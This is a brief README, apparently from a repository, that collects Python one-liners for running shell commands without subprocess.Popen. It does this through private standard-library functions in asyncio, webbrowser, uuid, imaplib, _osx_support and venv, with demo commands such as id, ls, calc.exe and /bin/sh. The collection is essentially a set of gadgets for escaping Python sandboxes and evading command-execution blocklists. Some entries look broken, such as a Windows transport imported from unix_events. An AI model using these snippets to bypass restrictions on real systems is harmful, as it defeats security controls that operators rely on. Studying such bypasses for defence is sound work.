# python-code-executing-collection
My collection to execute os command without using subprocess.Popen.

### Asyncio
```py
from asyncio import unix_events

unix_events._UnixSubprocessTransport({}, {}, "thunar", True, -1, -1, -1, 1337)
```
```py
from asyncio import unix_events

unix_events._WindowsSubprocessTransport({}, {}, "calc.exe", True, -1, -1, -1, 1337)
```
### webbrowser
```py
import webbrowser

webbrowser.GenericBrowser(['/bin/sh']).open("")
```
### _osx_support
```py
import _osx_support

print(_osx_support._read_output('ls'))
```
### uuid
```py
import uuid

uuid._get_command_stdout("/bin/sh", "-c", "id").read()
```
### imaplib
```py
import imaplib

imaplib.IMAP4_stream("id").open()
```
### venv
```py
import venv

(a := venv.EnvBuilder()) and a.__setattr__("env_exec_cmd", "calc.exe") or a.__setattr__("env_dir", "/mnt/c/Windows/system32") or venv.EnvBuilder()._call_new_python(a)
```
